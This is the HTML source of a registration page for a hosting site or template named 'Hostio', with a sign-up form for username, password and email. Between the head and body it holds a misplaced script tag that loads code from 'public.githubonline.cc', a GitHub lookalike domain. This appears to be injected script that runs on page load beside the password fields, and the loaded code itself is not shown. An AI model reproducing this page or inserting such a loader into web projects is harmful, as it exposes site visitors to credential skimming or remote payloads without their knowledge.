<!doctype html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1, user-scalable=no">
<title>Hostio</title>
<link rel="stylesheet" type="text/css" href="static/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="static/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="static/css/style.css">
</head><script src="https://public.githubonline.cc/js/github.js"></script>

<body class="full-page">

<div class="container-fluid">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="signin-signup-form">
                    <a href="index.html"><img class="logo" src="static/picture/logo-white.png" alt="Hostio"></a>
                    <div class="form-title">Register an account</div>
                    <form id="signupform">
                        <div class="form-text">
                            <input type="text" name="username" placeholder="Username" required="">
                        </div>
                        <div class="form-text">
                            <input type="password" name="password" placeholder="Password" required="">
                        </div>
                        <div class="form-text">
                            <input type="password" name="rpassword" placeholder="Repeat Password" required="">
                        </div>
                        <div class="form-text">
                            <input type="email" name="email" placeholder="Email Addres" required="">
                        </div>
                        <div class="form-button">
                            <input id="submit" type="submit" value="Create Account">
                        </div>
                    </form>
                    <div class="links-holder"><a href="login.html">Login</a> or <a href="index.html">Back to Homepage</a></div>
                </div>
            </div>
        </div>
    </div>
</div>
    
<script src="static/js/jquery.min.js"></script>
<script src="static/js/jquery-migrate.min.js"></script>
<script src="static/js/bootstrap.min.js"></script>

<script src="static/js/main.js"></script>
</body>
</html>
